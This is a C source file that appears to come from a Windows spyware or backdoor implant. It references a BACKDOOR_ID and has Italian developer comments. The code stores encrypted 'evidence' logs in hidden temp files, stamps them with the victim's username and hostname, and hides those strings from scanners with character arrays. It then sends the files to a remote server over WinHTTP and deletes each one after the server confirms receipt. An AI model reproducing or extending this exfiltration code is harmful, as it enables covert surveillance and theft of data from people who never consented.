#include <Windows.h>

#include "main.h"
#include "log_files.h"
#include "binpatched_vars.h"
#include "crypt.h"
#include "win_http.h"
#include "proto.h"
#include "agent_device.h"

extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];
extern PDEVICE_CONTAINER pDeviceInfo;

int __cdecl compare(const void *first, const void *second)
{
	return CompareFileTime(&((PWIN32_FIND_DATA)first)->ftCreationTime, &((PWIN32_FIND_DATA)second)->ftCreationTime);
}

VOID ProcessEvidenceFiles()
{
	HANDLE hFind;
	LPWSTR pTempPath, pFindArgument;
	WIN32_FIND_DATA pFindData;
	PBYTE pCryptedBuffer;

	pTempPath = GetTemp();

	pFindArgument = (LPWSTR)malloc(32767 * sizeof(WCHAR));
	PBYTE pPrefix = (PBYTE)BACKDOOR_ID + 4;
	while(*pPrefix == L'0')
		pPrefix++;
	wsprintf(pFindArgument, L"%s\\%S*tmp", pTempPath, pPrefix);

	hFind = FindFirstFile(pFindArgument, &pFindData);
	if (hFind == INVALID_HANDLE_VALUE)
		return;

	ULONG x = 0;
	do
	if (pFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		continue;
	else
		x++;
	while (FindNextFile(hFind, &pFindData) != 0);
	FindClose(hFind);

	ULONG i=0;
	x = min(x, 1024);
	hFind = FindFirstFile(pFindArgument, &pFindData);
	PWIN32_FIND_DATA pFindDataArray = (PWIN32_FIND_DATA)malloc(sizeof(WIN32_FIND_DATA)*x);	
	do
	{
		if (pFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;

		memcpy(pFindDataArray + i, &pFindData, sizeof(WIN32_FIND_DATA));
		i++;

		if (i >= x)
			break;
	}
	while (FindNextFile(hFind, &pFindData) != 0);
	FindClose(hFind);

	qsort(pFindDataArray, i, sizeof(WIN32_FIND_DATA), compare);
	for(x=0; x<i; x++)
	{	
		// do stuff
		ULONG uFileNameLen = wcslen(pTempPath) + wcslen(pFindDataArray[x].cFileName);
		PWCHAR pFileName = (PWCHAR)malloc(uFileNameLen * sizeof(WCHAR) + 2);
		wsprintf(pFileName, L"%s\\%s", pTempPath, pFindDataArray[x].cFileName);

		BOOL bFileSent = FALSE;
		HANDLE hFile = CreateFile(pFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			ULONG uFileSize = GetFileSize(hFile, NULL);
			if (uFileSize != INVALID_FILE_SIZE)
			{
				PBYTE pFileBuff = (PBYTE)malloc(uFileSize + sizeof(ULONG));
				if (pFileBuff)
				{
					ULONG uOut;
					*(PULONG)pFileBuff = uFileSize; // fize
					if (ReadFile(hFile, pFileBuff + sizeof(ULONG), uFileSize, &uOut, NULL))
					{
						if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pFileBuff, uFileSize + sizeof(ULONG), pSessionKey, &pCryptedBuffer)))
						{
							free(pCryptedBuffer);

							ULONG uResponseLen;
							PBYTE pResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
							if (pResponseBuffer)
							{
								Decrypt(pResponseBuffer, uResponseLen, pSessionKey);

								if (uResponseLen >= sizeof(DWORD) && *(PULONG)pResponseBuffer == PROTO_OK)
									bFileSent = TRUE;
								free(pResponseBuffer);
							}
						}
					}
#ifdef _DEBUG
					OutputDebugString(L"[!!] WinHTTPSendData FAIL @ log_files.cpp:105\n");
#endif
					free(pFileBuff);
				}
			}
			CloseHandle(hFile);
			if (bFileSent)
				DeleteFile(pFileName);
		}
	}

	free(pTempPath);
	free(pFindArgument);
}

// FIXME: switch per tornare buffer e nn scrivere su file.
HANDLE CreateLogFile(ULONG uEvidenceType, PBYTE pAdditionalHeader, ULONG uAdditionalLen, BOOL bCreateFile, PBYTE *pOutBuffer, PULONG uOutLen)
{
	LPWSTR pTempPath, pFileName, pFileSuffix, pTempFileSuffix;
	FILETIME uFileTime;
	HANDLE hFile;

#ifdef _DEBUG
	LPWSTR pDebugString = (LPWSTR)malloc(4096);
//	wsprintf(pDebugString, L"[+] CreateLogFile, uEvidenceType: %08x, pAdditionalHeader: %08x, uAdditionalLen: %08x\n", uEvidenceType, pAdditionalHeader, uAdditionalLen);
//	OutputDebugString(pDebugString);
	free(pDebugString);
#endif

	if (bCreateFile)
	{
		//TODO FIXME: check for filesystem space
		GetSystemTimeAsFileTime(&uFileTime);

		pFileName = (LPWSTR)malloc(32767 * sizeof(WCHAR));
		pFileSuffix = pTempFileSuffix = (LPWSTR)malloc(32767 * sizeof(WCHAR));
		wsprintf(pFileSuffix, L"%S", BACKDOOR_ID + 4);
		while(*pTempFileSuffix == L'0')
			pTempFileSuffix++;

		pTempPath = GetTemp();
		do
		{
			wsprintf(pFileName, L"%s\\%s%x%x.tmp", pTempPath, pTempFileSuffix, uFileTime.dwHighDateTime, uFileTime.dwLowDateTime);
			hFile = CreateFile(pFileName, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

			uFileTime.dwLowDateTime++;
			if (uFileTime.dwLowDateTime == 0)
				uFileTime.dwHighDateTime++;
		}
		while (hFile == INVALID_HANDLE_VALUE);
#ifdef _DEBUG
		pDebugString = (LPWSTR)malloc(4096);
		wsprintf(pDebugString, L"[+] New log file %s created\n", pFileName);
		OutputDebugString(pDebugString);
		free(pDebugString);
#endif
		free(pTempPath);
		free(pFileSuffix);
	}

	ULONG uFileLen;
	PBYTE pLogFileBuffer = CreateLogHeader(uEvidenceType, pAdditionalHeader, uAdditionalLen, &uFileLen);
	if (bCreateFile)
	{
		ULONG uOut;
		WriteFile(hFile, pLogFileBuffer, uFileLen, &uOut, NULL);
		free(pLogFileBuffer);

#ifdef _DEBUG
		pDebugString = (LPWSTR)malloc(4096);
		wsprintf(pDebugString, L"[+] Written %d bytes on %s\n", uFileLen, pFileName);
		OutputDebugString(pDebugString);
		free(pDebugString);
#endif
		free(pFileName);
		return hFile;
	}
	else
	{
		*pOutBuffer = pLogFileBuffer;
		*uOutLen = uFileLen;

		return (HANDLE)NULL;	
	}
}

PBYTE CreateLogHeader(ULONG uEvidenceType, PBYTE pAdditionalData, ULONG uAdditionalDataLen, PULONG uOutLen)
{
	WCHAR wUserName[256];
	WCHAR wHostName[256];
	FILETIME uFileTime;
	LOG_HEADER pLogHeader;
	PLOG_HEADER pFinalLogHeader;

	if (uOutLen)
		*uOutLen = 0;

	memset(wUserName, 0x0, sizeof(wUserName));
	memset(wHostName, 0x0, sizeof(wHostName));
	wUserName[0]=L'-';
	wHostName[0]=L'-';

	WCHAR strUser[] = { L'U', L'S', L'E', L'R', L'N', L'A', L'M', L'E', L'\0' };
	WCHAR strComputer[] = { L'C', L'O', L'M', L'P', L'U', L'T', L'E', L'R', L'N', L'A', L'M', L'E', L'\0' };
	GetEnvironmentVariable(strUser, (LPWSTR)wUserName, (sizeof(wUserName)/sizeof(WCHAR))-2);
	GetEnvironmentVariable(strComputer, (LPWSTR)wHostName, (sizeof(wHostName)/sizeof(WCHAR))-2);
	GetSystemTimeAsFileTime(&uFileTime);

	pLogHeader.uDeviceIdLen = wcslen(wHostName) * sizeof(WCHAR);
	pLogHeader.uUserIdLen = wcslen(wUserName) * sizeof(WCHAR);
	pLogHeader.uSourceIdLen = 0;
	if (pAdditionalData)
		pLogHeader.uAdditionalData = uAdditionalDataLen;
	else
		pLogHeader.uAdditionalData = 0;
	pLogHeader.uVersion = LOG_VERSION;
	pLogHeader.uHTimestamp = uFileTime.dwHighDateTime;
	pLogHeader.uLTimestamp = uFileTime.dwLowDateTime;
	pLogHeader.uLogType = uEvidenceType;

	// calcola lunghezza paddata
	ULONG uHeaderLen = sizeof(LOG_HEADER) + pLogHeader.uDeviceIdLen + pLogHeader.uUserIdLen + pLogHeader.uSourceIdLen + pLogHeader.uAdditionalData;
	ULONG uPaddedHeaderLen = uHeaderLen;
	if (uPaddedHeaderLen % BLOCK_LEN)
		while(uPaddedHeaderLen % BLOCK_LEN)
			uPaddedHeaderLen++;

	pFinalLogHeader = (PLOG_HEADER)malloc(uPaddedHeaderLen + sizeof(ULONG));
	PBYTE pTempPtr = (PBYTE)pFinalLogHeader;

	// log size
	*(PULONG)pTempPtr = uPaddedHeaderLen;
	pTempPtr += sizeof(ULONG);

	// header
	memcpy(pTempPtr, &pLogHeader, sizeof(LOG_HEADER));
	pTempPtr += sizeof(LOG_HEADER);

	// hostname
	memcpy(pTempPtr, wHostName, pLogHeader.uDeviceIdLen);
	pTempPtr += pLogHeader.uDeviceIdLen;

	// username
	memcpy(pTempPtr, wUserName, pLogHeader.uUserIdLen);
	pTempPtr += pLogHeader.uUserIdLen;

	// additional data
	if (pAdditionalData)
		memcpy(pTempPtr, pAdditionalData, uAdditionalDataLen);

	// cifra l'header a parte la prima dword che e' in chiaro
	pTempPtr = (PBYTE)pFinalLogHeader;
	pTempPtr += sizeof(ULONG);

	Encrypt(pTempPtr, uHeaderLen, pLogKey, PAD_NOPAD);

	if (uOutLen)
		*uOutLen = uPaddedHeaderLen + sizeof(ULONG);

	return (PBYTE)pFinalLogHeader;
}


BOOL WriteLogFile(HANDLE hFile, PBYTE pBuffer, ULONG uBuffLen)
{
	if (hFile == INVALID_HANDLE_VALUE || pBuffer == NULL || uBuffLen == 0)
		return FALSE;

	ULONG uPaddedLen = uBuffLen;
	while (uPaddedLen % 16)
		uPaddedLen++;

	// inserisce len e copia buffer originale 
	PBYTE pCryptBuff = (PBYTE)malloc(uPaddedLen + sizeof(ULONG));
	*(PULONG)pCryptBuff = uBuffLen;
	memcpy(pCryptBuff + sizeof(ULONG), pBuffer, uBuffLen);

	// cifra
	Encrypt(pCryptBuff+sizeof(ULONG), uBuffLen, pLogKey, PAD_NOPAD);

	// scrive
	ULONG uOut, retVal;
	retVal = WriteFile(hFile, pCryptBuff, uPaddedLen + sizeof(ULONG), &uOut, NULL);
	free(pCryptBuff);

	return retVal;
}